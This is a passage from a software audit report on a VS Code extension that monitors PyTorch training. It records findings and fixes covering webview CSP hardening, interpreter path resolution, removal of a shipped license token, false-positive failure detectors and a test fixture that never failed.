> handlers in `dashboard.html` were converted to `data-act` attributes behind a single
> delegated listener, and the chat and generator panels use `addEventListener`.
>
> `img-src` was also tightened from `* 'self' data: https:` — which permitted loading images
> from any host — to `{{CSP_SOURCE}} data:`.
>
> Guarded by tests that assert `script-src` carries a nonce and lacks `'unsafe-inline'`, that
> every `<script>` tag has the nonce, and that no `on*=` attribute survives.

All three webviews (`media/dashboard.html:6`, and the chat and generator templates at
`src/extension.ts:538,941`) use `script-src 'unsafe-inline'`. VS Code's own guidance is a
nonce-based policy; `'unsafe-inline'` disables the protection the header exists to provide.

The chat renderer does escape HTML before applying its markdown replacements
(`src/extension.ts:897`), which closes the most direct injection path — LLM output rendered
via `innerHTML`. But that escape is the *only* thing standing between model output and script
execution, and it is a hand-rolled regex chain.

**Fix** — generate a nonce per panel load, move the inline `<script>` bodies into files served
through `asWebviewUri`, and set `script-src 'nonce-${nonce}' ${webview.cspSource}`. Drop the
hand-rolled markdown renderer for a vendored `markdown-it` with HTML disabled.

---

### M-9 — Default `pythonPath` of `"python"` fails on most Linux and modern macOS

> **Status: fixed, and hardened beyond the original suggestion.** The manifest default is now
> `"python3"`, and `resolvePythonPath()` in `extension.ts` tries the configured value, then
> `python3`/`python`/`py` in order, before falling back to the configured string unchanged.
> This also closes a regression a second review pass caught in this same fix: a static
> `"python3"` default alone would have broken Windows, where the standard installer provides
> `python`/`py` but not `python3`. Verified by executing the resolver against this machine's
> actual `PATH` for three inputs (`"python3"`, `"python"`, a nonexistent binary) — all three
> correctly resolved to a working interpreter. A third review pass caught that the resolver
> re-spawns up to 4 child processes on every "Run" click; the result is now cached per
> configured value (invalidated automatically if the setting changes), verified to make one
> spawn on repeat calls with the same config and re-resolve correctly when the config changes.

`package.json:63` defaults to `"python"`. Debian, Ubuntu, and macOS since 12.3 ship `python3`
with no `python` alias. On this audit machine, `python` is not found at all.

The failure surfaces as an unexplained spawn error inside a dashboard that has already opened,
with no guidance. A judge on stock Ubuntu hits this on the first click.

**Fix** — default to `"python3"`, and on `ENOENT` retry the alternate name before showing an
error. Best: resolve through the `ms-python.python` extension API and use the interpreter the
user has already selected for the workspace.

---

### M-10 — The licensing layer is inert while the product is pitched as paid

> **Status: fixed.** The dead validation code is deleted: `validateLicense`,
> `getLicenseStatus`, `LicensePayload` and `LicenseStatus` are gone, so no reviewer reads a
> security mechanism that never runs. `licenseManager.ts` now says plainly that there is no
> gate, and records the constraint any future one must satisfy (asymmetric signature; ship
> the public key only).
>
> **A backdoor was also removed here that the finding did not mention.** The dashboard's
> "Go Pro" button wrote a hardcoded, signed JWT into the user's *global* settings —
> a shipped credential dressed up as a purchase flow. It now shows a notification stating
> features are unlocked for evaluation and that AI features need the user's own API key.
> The CI secret-scan job fails the build if any JWT-shaped literal returns.
>
> Also corrected: `shouldBypassArcCheck()` returned `true`, making `ensureArcTrainingInstalled`
> dead code (L-9). It returns `false`, so a missing `arc-training` is reported *before* the
> run instead of via an empty chart afterwards, and the dialog now states exactly what still
> works without it.

`isPro()` returns `true` unconditionally in both the public stub (`src/pro/licenseManager.ts:41`)
and the private original (`private_backup/src/pro/licenseManager.ts:90`). `validateLicense()`
and `getLicenseStatus()` are never called from anywhere. `DEMO_API_KEY` is declared and unused.

`arc_lens_business_plan.md` builds an ARR model on a $2.99/mo Pro tier that no code enforces.
Combined with C-1 (the signing secret is public anyway), the gate is decorative in both
directions.

**Fix** — for the hackathon, this is fine, but be explicit: label it *"Pro features unlocked
for evaluation"* in the UI and delete the dead validation code so reviewers are not reading a
security mechanism that does not run. Post-hackathon, C-1's asymmetric-signature fix is the
prerequisite for any real gate.

---

## Low

### L-1 — Final stdout line is dropped when it lacks a trailing newline
**Status: fixed.** The `close` handler drains `stdoutBuffer` through the same `ingest()` path
before emitting `done`. This mattered more after the remediation than before: `run_summary`
is now the last line written, and it is exactly the one that was being lost.

### L-2 — Pending batch can arrive after the `done` event
**Status: fixed.** `flushBatch()` clears its own timer and is called synchronously in the
`close` handler, after the tail drain and before `done`. The dashboard can no longer show
COMPLETED and then keep appending metrics behind it.

### L-3 — `metricHistory.shift()` is O(n) once the cap is reached
**Status: fixed.** Replaced with a `RingBuffer<T>` that overwrites a fixed slot, so insertion
is O(1) for arbitrarily long runs. `toArray()` returns the entries in order for the LLM
prompt and the exported report.

### L-4 — Generator panel leaks
**Status: fixed.** `openGeneratorPanel` reveals an existing panel instead of creating a
second one, registers `onDidDispose` to cancel the in-flight stream, and both stream callbacks
bail out if the panel has gone — so `postMessage` can no longer fire at a disposed webview.
Mirrors the `chatPanel` lifecycle, as suggested.

### L-5 — `contextBuilder` spreads the full metric array into `Math.max`
**Status: fixed.** `minOf`/`maxOf` reducers replace the spread. Covered by a test that builds
a prompt from a full 10 000-entry history, which is the case that would have thrown.

### L-6 — No tests, no CI, no linter
**Status: fixed. 122 tests across six suites, plus CI.**
- `tests/pure.test.js` (17) — `extractCodeBlock`, `buildScriptGenMessages`,
  `buildSystemPrompt`, `buildReportHtml`, including XSS escaping, the 10 000-entry case, and
  that a missing point breaks the chart line rather than being bridged.
- `tests/dashboard.test.js` (15) — compiles the dashboard's inline script after placeholder
  substitution, asserts the CSP is nonce-based with no inline handlers, asserts no external
  script and no `Math.random()`, unit-tests the GPU rate table.
- `tests/ring-buffer.test.js` (8) — ordering across wraps at the real 10 000 capacity.
- `tests/model-name.test.js` (5) — the formatter that replaced a stale lookup table.
- `tests/test_harness.py` (67, 10 of them end-to-end on real training loops) — risk heuristic,
  JSON finite-guard, structural detector, loss-trend robustness, fused gradient norm against
  the naive computation, AMP unscaled-loss capture, model resolution including the GAN case,
  checkpoint round-trip and RNG determinism, and the LR guard against a scheduler.

Writing these found four bugs that reading the code had not: the optimizer-to-model match
preferred a wrapper over the submodule it actually updates (so a GAN would have rolled back
both networks), `chatManager` called `onDone` twice per stream and duplicated the assistant
turn in history, `train_demo.py`'s epoch hook never fired, and `finish()` could emit two run
summaries.
- `.github/workflows/ci.yml` — TypeScript build + tests, Python harness tests on CPU torch,
  and a secret-scan job that fails the build on a secret-shaped literal or embedded JWT so
  C-1 cannot recur.

### L-7 — `.gitignore` silently excludes all documentation
`.gitignore` ends with `*.md` / `!README.md`. Every doc added to this repository is invisible
to git unless explicitly negated — including this file. Replace with targeted ignores.

### L-8 — Thirteen one-off patch scripts are committed

> **Status: fixed.** All thirteen deleted after confirming zero references from any build
> script, `package.json`, or source file.
`scripts/patch_theme.py`, `patch_scroll.py`, `fix_scroll_poorly.py`, `revert_parsing.py`, and
nine more are single-use string-replacement scripts against `dashboard.html`, retained after
their edits landed. They no longer run against the current file. A filename like
`fix_scroll_poorly.py` in a repository being judged on craft is a needless self-inflicted
wound. Delete them; git history holds them.

### L-9 — Dead code and duplicated CSS
- `ensureArcTrainingInstalled` (`src/extension.ts:91`) is unreachable — `shouldBypassArcCheck()`
  returns `true` unconditionally, so the arc-install prompt never appears.
- `.prompt-container` (`src/extension.ts:710,720`), `.card` (`:987,998`), and `.sub` (`:982,993`)
  are each declared twice with conflicting values; `@keyframes fadeIn` is defined twice in the
  generator template (`:1008,1110`).
- ~~`media/demo_dashboard.html` (175 KB) is excluded from packaging and referenced by nothing.~~
  **Fixed** — deleted. It duplicated the exact `enrichEvent()` fabrication bug fixed in C-2.

### L-10 — Risk badge color decoupled from its own label
**Status: fixed.** `media/dashboard.html`'s risk tile colored itself by re-checking
`msg.score` against hardcoded thresholds (`>0.8` red, `>0.5` orange) instead of using the
`label` string the backend already computed. `runner.py`'s "diverging" phase emits
`score=0.45` with `label="MEDIUM"` — 0.45 fails the `>0.5` cutoff, so the badge showed the
text "MEDIUM" in green. Fixed by mapping color directly from `label` (`RISK_COLORS` lookup
in the rebuilt dashboard), so the badge text and its color can no longer disagree. Verified
live: sending `{label:"MEDIUM", score:0.45}` now renders `rgb(245, 158, 11)` (orange), not
green.

### L-11 — `vsce`'s ignore-file matching is not gitignore-equivalent for nested paths
A bare pattern like `*.md` in `.gitignore` matches at any directory depth (standard
gitignore semantics), but the same pattern in `.vscodeignore` does **not** — `vsce`
apparently only matches it against top-level entries. Moving the audit docs into `docs/`
silently reintroduced the doc-in-package leak from C-1's earlier fix: `vsce ls` showed all
seven `docs/*.md` files bundled into the `.vsix` despite `.vscodeignore` containing
`*.md`/`!README.md`. Fixed by changing the pattern to `**/*.md`. Re-verified with `vsce ls`
— clean. **Takeaway: any future `.vscodeignore` pattern meant to match recursively must
use an explicit `**/` prefix; don't assume gitignore-style implicit recursion.**

---

## Second review pass

**Date:** 2026-08-22. **Scope:** the remediated tree, re-reviewed independently after every
finding above was marked fixed.

The first pass moved the measurement anchor, deleted the fabricated telemetry and turned the
silent excepts into visible degradation. Re-reviewing that work found six more defects, three
of them Critical — including one that would have crashed the majority of real training scripts
before the first step, and one that quietly protected the control arm of the A/B experiment
this project's headline numbers come from. They are in this document because the remediation
was reviewed again rather than declared done.

### C-4 — Constructing any LR scheduler raised `AttributeError` before training started ⚠⚠

The first pass wrapped `step` per *instance* (see M-1): `Optimizer.__init__` was patched and
each instance had a plain function assigned to `self.step`. `LRScheduler.__init__` reaches into
`optimizer.step.__func__` to install its own step counter. A plain function has no `__func__`.
A bound method does.

So on any script that did this:

```python
optimizer = torch.optim.SGD(model.parameters(), lr=0.1)
scheduler = torch.optim.lr_scheduler.CosineAnnealingLR(optimizer, T_max=50)
```

the second line raised `AttributeError: 'function' object has no attribute '__func__'` — before
a single batch was loaded. Every scheduler in `torch.optim.lr_scheduler` inherits that
`__init__`: `StepLR`, `MultiStepLR`, `CosineAnnealingLR`, `OneCycleLR`, `ReduceLROnPlateau`,
`LambdaLR`. A scheduler is standard practice in most real training code, so the practical blast
radius was "ARC Lens crashes the majority of scripts it is pointed at, immediately".

**Why nothing caught it.** `python/train_demo.py` sets `group["lr"]` by hand and never
constructs a scheduler. `benchmark_overhead.py` and `experiment_ab.py` both run that same
script. The end-to-end tests that exercise scheduler *interaction*
(`test_scheduler_cannot_undo_the_reduction`, `test_intervention_survives_the_scheduler`)
simulate a scheduler by writing `group['lr']` directly rather than constructing one. Every
piece of validation the project had shared the same blind spot.

**A claim in this repository was the exact inverse of the truth.** Both `docs/ARCHITECTURE.md`
§5 and `_arc_bootstrap.py`'s module docstring described instance-level wrapping as "the same
technique PyTorch's own LR schedulers use". Schedulers do not use it; they *reject* it — their
`__init__` requires the attribute a plain function does not carry. The sentence was written to
justify the design and was never checked against the code it described.

> **Status: fixed.** The wrapper is bound with `types.MethodType(arc_step, self)`, which
> restores `__func__` and makes the replacement indistinguishable from the method it replaced.
> The false "same technique the schedulers use" claim is removed from `ARCHITECTURE.md` §5,
> `FUTURE_IMPROVEMENTS.md` §2.1 and the `_arc_bootstrap.py` module docstring.
>
> **The blind spot is closed too.** `test_lr_schedulers_can_be_constructed` runs a real script
> through the real runner that constructs both a `CosineAnnealingLR` and a
> `ReduceLROnPlateau`, steps them for 20 iterations, and asserts no error event is emitted. It
> fails against the pre-fix code. That test mattered more than the one-line fix: the defect was
> Critical and survived a full audit purely because nothing in the project had ever constructed
> a scheduler.

---

### C-5 — An absent loss was treated as a NaN loss, freezing healthy runs ⚠⚠

`STATE.pending_loss` is written by exactly two patched call sites: `Tensor.backward` and
`GradScaler.scale`. It is legitimately `None` whenever the user reaches the backward pass any
other way:

* `torch.autograd.backward(loss)` — the function form, not a `Tensor` method, so the patch never
  sees it.
* a non-scalar backward, which the recorder skips by design.
* a closure-driven optimizer such as `LBFGS`, which runs `backward()` *inside* `step()`.

The step hook read `pending_loss`, found `None`, substituted `float("nan")`, and then ran the
health test `isnan or isinf or |loss| > 1e6` against its own placeholder. Every step of a
perfectly healthy run therefore "detected" a numerical failure: roll back to the last
checkpoint, cut the learning rate, zero the gradients before the user's real update. The model
never moved. The dashboard filled with successful-looking interventions and the run reported a
clean finish.

This is the worst shape a reliability tool can fail in — it broke training that was working,
and its own telemetry said it was helping.

> **Status: fixed.** An unobservable loss is now recorded as *unknown*, never as a failure.
> Gradient, LR and memory telemetry continue; loss-based detection is skipped for that step;
> `_finite()` renders the loss as a genuine gap rather than a number. A one-time `degraded`
> event (`loss_unavailable`) names the three causes explicitly, so the header shows DEGRADED
> instead of the run silently reporting less than it claims to measure.

---

### C-6 — Three "we are not intervening" paths silently discarded the user's update ⚠⚠

All three early exits in `_handle_failure` called `optimizer.zero_grad()` before returning.
Zeroing gradients immediately before the caller's `optimizer.step()` makes that step a no-op —
which *is* an intervention, and on a diverging run it is the most consequential one available,
since discarding every bad update is most of what a rollback accomplishes. Each path therefore
contradicted its own log line:

* **Unrecoverable** (`attempts >= ARC_MAX_ATTEMPTS`) logged "the run continues untouched so the
  failure stays visible". It froze the model for the remainder of the run instead. The one
  message whose entire purpose is *stop paying for this GPU* described a run that could no
  longer produce the evidence to judge that on.
* **Cooldown** logged "letting the previous recovery take effect" while suppressing up to
  `ARC_COOLDOWN_STEPS` (default 15) consecutive updates whose gradients were never bad — so the
  recovery being evaluated was evaluated against 15 steps of no training at all.
* **Baseline mode** logged "interventions suppressed" and then performed one. This is the
  serious one. `ARC_MODE=baseline` is the control arm of the A/B in
  `docs/EXPERIMENT_RESULTS.md`. On every step where the control arm detected a failure it
  received the single most effective protection ARC has — the bad update dropped — while being
  reported as the untreated arm. The experiment built to measure what interventions are worth
  was applying an intervention to its own control.

> **Status: fixed.** All three branches `return` without touching gradients. `zero_grad` now
> appears exactly once in the failure path: *after* a recovery has actually been applied, where
> suppressing the NaN-producing update is the intended effect and is logged as such.

---

### H-5 — Wrapper optimizers were instrumented twice

Optimizers that subclass `Optimizer` *and* delegate to an inner `Optimizer` — Lookahead, SAM,
and most "wrap your optimizer" recipes — run both objects through the patched
`Optimizer.__init__`, so both had their `step` wrapped. One user-level update then fired the
hook twice: the step counter advanced by two per update, two `metric` events were emitted for
one update, and the second hook found `pending_loss` already consumed by the first. Before C-5
that second read was a `NaN`, so ARC diagnosed a numerical failure on step 1 of a healthy run
and rolled back before it had a checkpoint worth rolling back to.

> **Status: fixed.** `patched_init` sets an `_arc_instrumented` flag on the instance and returns
> early when it is already set, so only the outermost optimizer in a delegation chain is
> instrumented — which is also the one whose `step` corresponds to a user-level weight update.

---

### H-6 — C-2's fabrication survived in one dashboard line

C-2 deleted `enrichEvent()` and this document recorded fabricated telemetry as a closed class of
defect. One line of it was still live:

```js
gradNorms.push(msg.grad_norm ?? 0.001);
```

When the backend sent no gradient norm — unresolved model, collector failure, any degraded path
— the chart drew `0.001` as a measured point, indistinguishable from a real reading, and the
stat tile rendered `0.000`. A gradient norm of ~1e-3 is not a neutral placeholder: it is the
signature of vanishing gradients. The fabricated value told the exact story the missing data
could not support.

> **Status: fixed.** The line pushes `null`, which the chart renders as a gap, and the stat tile
> shows an em-dash rather than a number. C-2's rule — absent beats fabricated — now holds across
> the whole file, including the defaults that looked harmless.

---

### H-7 — The script generator emitted an API that does not exist

The Pro script generator's system prompt instructed the model to produce:

```python
import arc
model = arc.wrap(model)
```

and told it that "arc patches backward() automatically via `arc.wrap()`". There is no
`arc.wrap`, and no ARC API a training script is meant to call at all. ARC Lens instruments a
script *externally* — `runner.py` installs the patches and anchors on `Optimizer.step` — and
"your script contains nothing ARC-specific" is the product's central claim. Every script the
generator produced contained an import and a call that could only raise, so the feature's output
was guaranteed broken on first run, on a demo path a judge is likely to try.

> **Status: fixed.** The prompt now asks for plain idiomatic PyTorch with no ARC imports,
> wrappers, decorators or callbacks, and states the two things that actually matter to the
> harness: call `loss.backward()` on a scalar loss followed by `optimizer.step()` (not
> `torch.autograd.backward()`, which is not observable), and under AMP use
> `scaler.scale(loss).backward()` / `scaler.step(optimizer)`. `arc_set_epoch()` is offered as an
> optional `NameError`-guarded call the script runs fine without. A comment above the prompt
> records what the old one asked for, so it does not get reintroduced.

---

**Validation pass, 2026-08-22.** The two findings below did not come from reading the code
again. They came from running it: a real CIFAR-10 A/B at four learning rates, against the
intervention-free control arm that C-6 had just made trustworthy. Both are Critical, and both
are about the detector rather than the plumbing around it.

### C-7 — The `gradient_entropy_collapse` rule destroyed a healthy run, then declared it unrecoverable ⚠⚠

`check_structural()` raised `gradient_entropy_collapse` when gradient entropy fell below 1% of
the baseline captured from the run's opening samples. On a real CIFAR-10 A/B at `lr=0.25`, with
the intervention-free control arm C-6 had just made trustworthy:

| Arm | Final val accuracy | Failures | Interventions |
| :--- | ---: | ---: | :--- |
| baseline (control) | **87.43%** | 0 | — |
| active | **10.00%** — chance | first at step **125** | 3 × `rollback_and_reduce_lr`, then `unrecoverable` |

Both arms are the same script, same seed, same data order. At the end of epoch 1 the control
arm was at 19.19% train accuracy and climbing to 88.54%; the active arm was at 11.49% and then
flat at ~9.9% for the rest of the run, its LR cut from 2.45e-01 to 3.07e-02 by three 0.5×
reductions inside that first epoch.

ARC destroyed a healthy run and then correctly reported it unrecoverable — because ARC had made
it so. This is C-5's failure shape again with a worse outcome: the intervention log for that run
reads as a tool working hard, and only the control arm shows what it cost.

**No threshold could have saved the rule.** Measuring the entropy trajectory afterwards, sampled
every 10 steps over two epochs, on a healthy run and a genuinely dead one:

```
step   lr=0.25 (healthy, 87.4%)   lr=0.50 (dead, 10%)
   1              2.95e-01              2.95e-01
  30              1.09e-02              1.26e-01
  70              1.44e-05              1.45e-05
 200+             1.44e-05              1.29e-05
```

The healthy run and the dead run settle to *the same value*. After roughly step 70 the signal
carries no information about run health at all, so there is no threshold, no baseline window and
no persistence requirement that separates the two cases. The rule was not mistuned; it was
measuring nothing.

The root cause is upstream, in `arc-training`: `GradientCollector._compute_entropy` bins a
heavy-tailed gradient distribution with `torch.histc` on a *linear* scale. A few outliers set
the range, essentially all the mass lands in one bin, and the normalised entropy saturates near
zero for any run. It is a measure of outlier spread, not of information content.

> **Status: fixed.** The rule is deleted. `gradient_entropy` is still collected and charted,
> because it is a legitimate thing to show a human; it cannot trigger an intervention. Making it
> a trigger again requires log-magnitude binning upstream *and* a fresh trajectory measurement
> showing separation between a healthy and a failing run — not an argument about what entropy
> ought to mean.
>
> **Second fix, and the more general one:** structural checks now wait
> `STRUCTURAL_WARMUP_STEPS` (default 200, `ARC_STRUCTURAL_WARMUP`) before capturing a baseline
> at all. Every structural signal moves by orders of magnitude in a run's opening steps on
> healthy and failing runs alike, simply because the model goes from random to structured. A
> baseline captured inside that transient makes normal early learning look like collapse, which
> is exactly how this rule came to fire at step 125 on a run that was fine.
>
> **This is the second rule in a row removed for the same reason.** `update_ratio_high` went
> first (see `ARCHITECTURE.md` §5), for a distribution that overlapped almost completely between
> healthy and dead runs; this one goes for a signal that converges to an identical value on
> both. In each case a signal's natural early-training trajectory resembled the pathology it was
> meant to detect. The shipped detection surface is now materially smaller than this project
> once claimed. As of the latest sweep it is numerical divergence and gradient-norm clipping;
> the two surviving structural rules detect and report but are no longer allowed to act, after
> their responses were measured making failing runs worse. That is the honest size of it.

---

### C-8 — The test suite was certifying the bug: the divergence fixture never diverged ⚠⚠

Deleting the entropy rule broke three integration tests:
`test_divergence_is_detected_and_recovered`, `test_intervention_survives_the_scheduler` and
`test_baseline_mode_reports_but_never_intervenes`. The first read was a regression in the
deletion. It was not.

`SCRIPT_DIVERGE`, the fixture all three used, **never diverged**. Run in plain PyTorch with no
ARC involved, its loss peaks at 1.93 and never approaches the 1e6 divergence threshold — the
condition those tests exist to exercise was never reached in any of them. They passed because
the entropy false positive fired on the fixture, and `assertTrue(failures)` cannot distinguish a
real detection from a spurious one.

So for as long as the entropy rule existed, the suite reported that divergence detection,
scheduler-proof LR reduction and baseline-mode reporting all worked, and the only evidence it
had for any of the three was the false positive. Removing the bug is what made the tests fail;
the bug is what had been making them pass.

This is worse than C-4's blind spot. There, validation never exercised the path. Here,
validation exercised the wrong path and returned green, so the suite was actively defending a
defect that cost a full run of accuracy.

> **Status: fixed.** `SCRIPT_DIVERGE` is rebuilt as a fixture verified to diverge *without ARC
> attached first* — loss crosses 1e6 at step 10 and reaches ~1.2e10 — and the comment above it
> records the measurement and the requirement that any future detection fixture be checked the
> same way. The assertion is tightened from "something fired" to
> `failures[0]["kind"] == "numerical"`, so a false positive from any unrelated rule can no
> longer satisfy it. The general rule this leaves behind: a test that asserts a detector fired
> must assert *what* it fired on, and a fixture that is supposed to fail must be shown to fail
> with the tool removed.

---

## Recommended order

**Before any demo or submission**

1. C-2 — delete `enrichEvent()`. Highest damage, ~10 lines removed.
2. C-3 — delete `context.md`.
3. H-2 — vendor Chart.js locally. Removes the network from the demo path.
4. M-9 — default to `python3` with a fallback.
5. C-1 — revoke the token, strip the secret, disable source maps.

**Before publishing another version**

6. H-1 — `scope: "machine"` (not `"machine-overridable"` — that's still workspace-settable), `execFile` instead of `exec`.
7. H-3 — guard `dev_disable.js` (or delete both scripts).
8. H-4 — decide publicly: real harness, or an unmistakably-labelled demo.

**Before claiming production readiness**

9. M-1, M-2 — correct and cheap instrumentation.
10. M-5, M-6, M-7 — bounded memory, public APIs, visible failures.
11. L-6 — tests on the pure functions, and CI that runs them.
12. ~~C-4 — a test fixture that constructs a real `torch.optim.lr_scheduler` object.~~ **Done**
    (`test_lr_schedulers_can_be_constructed`). Worth keeping on the list as a lesson rather than
    a task: the project's entire validation surface — demo, benchmark, A/B harness — constructed
    no scheduler, which is how a crash affecting most real scripts passed a full audit. The
    remaining gap of the same shape is that `train_demo.py` still writes `group["lr"]` by hand,
    so the *shipped reference script* exercises no scheduler either.
